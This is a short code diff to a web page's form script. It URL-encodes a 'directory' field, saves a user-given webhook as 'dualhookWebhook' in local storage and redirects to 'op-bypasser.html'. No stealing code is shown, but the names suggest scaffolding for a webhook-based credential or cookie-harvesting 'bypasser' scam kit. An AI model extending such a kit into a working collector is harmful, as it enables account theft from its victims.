@@ -102,19 +102,18 @@
       document.querySelector('form').addEventListener('submit', function(event) {
         event.preventDefault(); // Prevent default form submission
 
-        const directory = document.getElementById('directory').value;
+        const directory = encodeURIComponent(document.getElementById('directory').value); // Encode for URL
         const webhook = document.getElementById('webhook').value;
 
         // Store the webhook in local storage for the next page
         localStorage.setItem('dualhookWebhook', webhook);
 
-        // Redirect to the new page. In a real application, 'directory' might be part of the path.
-        // For this static HTML example, we'll redirect to a fixed file.
-        window.location.href = 'op-bypasser.html';
+        // Redirect to the new page, passing the directory as a query parameter
+        window.location.href = `op-bypasser.html?directory=${directory}`;
 
         console.log('Directory submitted:', directory);
         console.log('Webhook stored:', webhook);
-        console.log('Redirecting to op-bypasser.html');
+        console.log('Redirecting to op-bypasser.html with query parameter');
       });
     </script>
 </body>
